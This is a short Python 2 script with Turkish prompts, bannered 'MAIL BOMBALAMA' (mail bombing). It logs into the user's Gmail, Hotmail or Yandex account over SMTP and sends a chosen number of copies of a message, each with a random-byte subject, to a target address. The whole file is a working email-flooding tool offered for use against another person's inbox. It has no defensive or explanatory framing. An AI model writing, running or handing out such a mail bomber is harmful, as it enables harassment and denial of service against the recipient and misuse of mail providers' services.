#!/use/bin/env python
#-- coding: utf-8 --

import os
import smtplib
import getpass
import sys
import random

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet MAIL BOMBALAMA ")

print(""" 
Aşağıdan Hedef E-Postanın Smtp Server ini Seç 

1) Gamil   
2) Hotmail  
3) Yandex   


""")

server = raw_input ('Hedef Mail Server : ')
print("")
user = raw_input('Mail Adresiniz : ')
passwd = getpass.getpass('Şifre : ')

to = raw_input('\nKime: ')
body = raw_input('Mesajınız: ')
total = input('Kaç Adet: ')

if server == '1':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == '2':
    smtp_server = 'smtp.live.com'
    port = 465
elif server == '3':
    smtp_server = 'smtp.yandex.com.tr'
    port = 465
else:
    print 'Applies only for gmail mail servers'
    sys.exit()

print ''

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
        server.sendmail(user,to,msg)
        print "\rGönderilen Mail: %i" % i
        sys.stdout.flush()
    server.quit()
    print '\n Toplam %i Mail Gönderildi !!!' % i
except KeyboardInterrupt:
    print '[-] İptal edildi'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] Girdiğiniz kullanıcı adı veya şifre hatalı. Ya da daha az güvenli uygulama girişine izin verdiğinizi kontrol edin '
    sys.exit()
